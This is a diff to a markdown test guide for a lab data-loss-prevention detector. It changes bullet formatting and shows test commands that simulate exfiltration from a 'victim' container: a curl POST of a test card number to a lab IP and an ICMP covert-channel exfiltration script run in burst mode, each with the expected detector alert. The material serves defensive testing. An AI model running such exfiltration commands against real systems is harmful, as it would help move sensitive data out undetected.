@@ -22,7 +22,7 @@
 
 ### 1.2 Credit Card Exfiltration (Luhn Block)
 
-* **Command (Victim):**
+- **Command (Victim):**
 ```bash
 docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "card=4111-1111-1111-1111"
 ```
@@ -79,7 +79,7 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
   ```
 
 
-* **Expected Alert in `covert-detector`:**
+- **Expected Alert in `covert-detector`:**
   ```json
   [DLP-ALERT] {"channel": "covert_icmp", "rule_id": "icmp_sensitive_data_luhn_cc", "severity": "high", "details": {"matched": "4532015112830366", "detector": "luhn"}}
   ```
@@ -90,13 +90,13 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
 
 ### 2.4 Rapid Exfiltration Burst (Behavioral Rate Limiting)
 
-* **Command (Victim):**
+- **Command (Victim):**
   ```bash
   docker compose exec victim python attacks/icmp_exfiltrate.py --mode burst --count 6 --delay 0.05
   ```
 
 
-* **Expected Alert in `covert-detector`:**
+- **Expected Alert in `covert-detector`:**
   ```json
   [DLP-ALERT] {"channel": "covert_icmp", "rule_id": "icmp_high_frequency", "severity": "high", "details": {"count": 5, "window_seconds": 1.0, "threshold": 4}}
   ```
